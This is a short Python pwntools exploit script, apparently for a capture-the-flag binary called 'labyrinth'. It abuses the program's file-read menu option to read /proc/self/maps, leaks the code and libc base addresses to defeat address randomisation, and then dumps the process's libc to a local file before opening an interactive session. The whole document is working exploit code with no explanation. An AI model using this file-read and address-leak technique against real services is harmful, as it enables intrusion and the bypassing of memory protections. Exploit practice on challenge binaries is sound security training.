from pwn import *

p = process("./labyrinth_patched")
print p.recv()
p.sendline("3")
print p.recv()
p.sendline("/proc/self/maps")

codebase = int(p.recvuntil("-")[:-1],16)
p.recvuntil("[heap]\x0a")
libcbase = int(p.recvuntil("-")[:-1],16)
p.recvuntil("/")
libcname = "/"+p.recvline()[:-1]
print hex(codebase)
print hex(libcbase)
print libcname
p.close()

p = process("./labyrinth_patched")
print p.recv()
p.sendline("3")
print p.recv()
p.sendline(libcname)

f = open("libc", "wb")
while True:
	libc = p.recv()
	f.write(libc)
	if "1. make_labyrinth" in libc:
		break
f.close()
p.interactive()
